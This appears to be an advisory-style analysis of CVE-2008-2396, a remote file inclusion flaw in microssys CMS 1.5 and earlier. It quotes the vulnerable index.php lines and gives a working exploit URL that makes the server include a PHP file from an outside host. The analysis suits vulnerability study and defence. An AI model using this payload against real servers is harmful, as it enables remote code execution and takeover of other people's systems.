Based on the provided content, here's a breakdown of the vulnerability described for CVE-2008-2396:

**Root Cause of Vulnerability:**
The vulnerability stems from the `index.php` file in `microssys CMS` improperly handling user input related to page inclusion. Specifically, it uses user-supplied input (from the `$_REQUEST["1"]` parameter) to determine which page to include. The application also uses an array called `$PAGES` and if `$P` value is not set inside that array then `TH.txt` is included. If it's present in the array, it includes it without proper sanitization, leading to remote file inclusion.

**Weaknesses/Vulnerabilities Present:**
*   **Remote File Inclusion (RFI):** The primary vulnerability is RFI. The application allows an attacker to include a remote file by manipulating the `PAGES` array with user controlled input.
*   **Lack of Input Sanitization:** The code doesn't validate or sanitize the user-supplied input used in the `@include()` function. This allows for inclusion of arbitrary files from remote locations.
*   **Direct Inclusion of User Input:** The code directly includes files based on user-provided input, a classic sign of an RFI vulnerability.

**Impact of Exploitation:**
*   **Arbitrary Code Execution:** An attacker can include a malicious file from a remote server, which could lead to arbitrary code execution on the server running the vulnerable application.
*   **Server Compromise:** Successful exploitation could give the attacker full control of the web server and the data it hosts.
*   **Data Theft and Manipulation:** An attacker could steal sensitive data, modify content, or perform other malicious actions.

**Attack Vectors:**
*   **HTTP GET Request:** The vulnerability is exploited via a specially crafted HTTP GET request.
*   **Manipulating Request Parameters:** The attacker manipulates the `1` parameter and adds the `PAGES` array with a malicious URL.

**Required Attacker Capabilities/Position:**
*   **Network Access:** The attacker needs network access to the vulnerable server.
*   **Basic Understanding of Web Technologies:** The attacker needs a basic understanding of HTTP, PHP, and how file inclusion vulnerabilities work.
*   **Ability to Host Malicious File:** The attacker must host a malicious PHP file on a publicly accessible server to include it in the vulnerable system.

**Technical Details:**

The vulnerable code is in `index.php`:
```php
## Vulnerable code (index.php@22-25,54-55):
## [22] if(isset($_REQUEST["1"])){
## [23] $P=$_REQUEST["1"];}else{
## [24] $P="main";
## [25] }
## [..]
## [54] if(isset($PAGES[$P])){}else{include("TH.txt");}
## [55] @include($PAGES[$P]);
```
The exploit is performed using this URL:
`http://host/index.php?1=lol&PAGES[lol]=http://raz0r.name/s.php`
This sets `$P` to "lol", then includes the file specified by `PAGES["lol"]` which is an arbitrary url.

The content also mentions that the vulnerable version is `microssys CMS <= 1.5`.
